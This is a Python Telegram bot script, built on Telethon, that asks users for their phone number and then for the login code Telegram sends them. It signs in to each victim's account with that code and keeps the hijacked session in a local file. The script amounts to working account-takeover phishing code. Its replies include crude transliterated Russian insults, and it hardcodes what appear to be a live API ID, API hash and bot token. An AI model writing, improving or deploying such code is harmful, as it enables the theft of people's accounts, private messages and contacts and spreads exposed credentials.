import asyncio
import re
from telethon import TelegramClient, events
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    FloodWaitError
)

API_ID = 35911533
API_HASH = "11dafcdc1514796c867055023716d39a"
BOT_TOKEN = "8346402249:AAGrv_AIuNJNJ06-Y2-vTASyB_NRgyzhJZI"

bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_state = {}
user_phone = {}
user_hash = {}

def normalize_phone(phone: str) -> str:
    digits = re.sub(r'[^\d]', '', phone)
    if phone.startswith('+'):
        digits = '+' + digits
    else:
        if digits.startswith('0'):
            digits = '+38' + digits
        elif digits.startswith('380'):
            digits = '+' + digits
        else:
            digits = '+' + digits
    return digits

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.chat_id
    user_state[user_id] = 'awaiting_phone'
    await event.respond("zdarova ueban pishi nomer telephona")

@bot.on(events.NewMessage)
async def message_handler(event):
    user_id = event.chat_id
    text = event.text.strip()
    state = user_state.get(user_id)

    if state == 'awaiting_phone':
        phone = normalize_phone(text)
        if len(phone) < 6:
            await event.respond("nevernii nomer")
            return
        try:
            client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
            await client.connect()
            sent = await client.send_code_request(phone)
            user_phone[user_id] = phone
            user_hash[user_id] = sent.phone_code_hash
            user_state[user_id] = 'awaiting_code'
            await event.respond("cod otpravlen chekni")
        except PhoneNumberInvalidError:
            await event.respond("nevernii nomer")
        except FloodWaitError as e:
            await event.respond(f"slikom chasto. podozdi {e.seconds} sec.")
        except Exception:
            await event.respond("ochibka otpravki coda")
        finally:
            await client.disconnect()

    elif state == 'awaiting_code':
        code = text.strip()
        if not code.isdigit():
            await event.respond("vvedi tolko cifry")
            return
        phone = user_phone[user_id]
        phone_code_hash = user_hash[user_id]
        try:
            client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            user_state.pop(user_id, None)
            user_phone.pop(user_id, None)
            user_hash.pop(user_id, None)
            await event.respond("tvoia mama umerla idi nahui")
        except PhoneCodeInvalidError:
            await event.respond("nevernii kod")
        except PhoneCodeExpiredError:
            await event.respond("cod istek. pishi /start zanovo")
            user_state.pop(user_id, None)
            user_phone.pop(user_id, None)
            user_hash.pop(user_id, None)
        except SessionPasswordNeededError:
            await event.respond("nuzen parol. ne mogu voity")
        except FloodWaitError as e:
            await event.respond(f"slikom chasto. podozdi {e.seconds} sec.")
        except Exception:
            await event.respond("ochibka vxoda")
        finally:
            await client.disconnect()

async def main():
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
